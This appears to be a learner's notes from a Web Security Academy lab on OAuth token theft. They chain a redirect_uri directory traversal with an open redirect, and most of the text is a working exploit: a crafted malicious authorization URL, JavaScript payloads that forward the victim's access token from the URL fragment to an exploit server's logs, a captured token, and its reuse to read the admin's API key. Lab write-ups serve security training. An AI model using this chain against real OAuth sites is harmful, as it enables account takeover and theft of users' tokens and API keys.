/*

a) GET /auth?client_id=a14q0wgfugviuf1r26tsz&redirect_uri=https://0a6900420495e04c828074a700110085.web-security-academy.net/oauth-callback&response_type=token&nonce=-696262928&scope=openid%20profile%20email HTTP/1.1

https://oauth-0a2c00810485e00082a4724502380024.oauth-server.net/auth?client_id=a14q0wgfugviuf1r26tsz&redirect_uri=https://0a6900420495e04c828074a700110085.web-security-academy.net/oauth-callback&response_type=token&nonce=-696262928&scope=openid%20profile%20email

b) the API key can be accessed in the response of request GET /me HTTP/2
access token grant step after posting the creds

c) access token is revealed in the response to GET /auth/gJKYebj9KzO9evbp8ep2D HTTP/2
in the URL fragment #access_token before the access token grant step


d) email username and token then get sent via POST /authenticate HTTP/2

GET /auth/gJKYebj9KzO9evbp8ep2D --- access token revealed in URL
get /me --- response --- api key revealed
post /authenticate --- token --- logged in implicitly
 ///maybe check the redirect parameter in URL in a) for open redirect to your exploit server malicious iframe
 ///will it give you the access token for the admin? 
 
 ///there occurs a redirect_uri mismatch error 

e) intercept an authenticated request
GET /auth?client_id=a14q0wgfugviuf1r26tsz&redirect_uri=https://0a6900420495e04c828074a700110085.web-security-academy.net/oauth-callback&response_type=token&nonce=-696262928&scope=openid%20profile%20email HTTP/1.1

edit and send
GET /auth?client_id=a14q0wgfugviuf1r26tsz&redirect_uri=https://0a6900420495e04c828074a700110085.web-security-academy.net/oauth-callback../post?postId=1&response_type=token&nonce=-696262928&scope=openid%20profile%20email HTTP/1.1
//this leads to a blog post so this request is vuln to directory traversal

f) GET /post/next?path=https://www.google.com HTTP/2
find the next button on the blog post
//the path parameter in the url query is vulnerable to open redirect


e) Craft a malicious URL that combines these vulnerabilities. 
You need a URL that will initiate an OAuth flow with the redirect_uri 
pointing to the open redirect, 
which subsequently forwards the victim to your exploit server:

https://oauth-0a23005d034753aa81631e7e021300e3.oauth-server.net/auth?client_id=w0mkkoy8y6isp794dnauk&redirect_uri=https://0ad3008003f553db817c207600c000b5.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ae700ca03d2532c81841fd9012e00af.exploit-server.net/exploit&response_type=token&nonce=1449042725&scope=openid%20profile%20email


f) a script to leak the access token on accessing the malURL in the access logs
<script>
window.location = '/?'+document.location.hash.substr(1)
</script>
store this in the exploit server and visit the malurl
access token captured in the server logs

g) a script to force the user to visit the malURL and leak the access token

<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0a23005d034753aa81631e7e021300e3.oauth-server.net/auth?client_id=w0mkkoy8y6isp794dnauk&redirect_uri=https://0ad3008003f553db817c207600c000b5.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ae700ca03d2532c81841fd9012e00af.exploit-server.net/exploit&response_type=token&nonce=1449042725&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>

store and view exploiit, deliver to victim and copy access token from logs
z-RPi252OlMoqMR46dzCo9xkCaGXJQ1kh5W3zn0jD6R

h) send GET /me to repeater 
Authorization: Bearer z-RPi252OlMoqMR46dzCo9xkCaGXJQ1kh5W3zn0jD6R

//api key revealed

*/



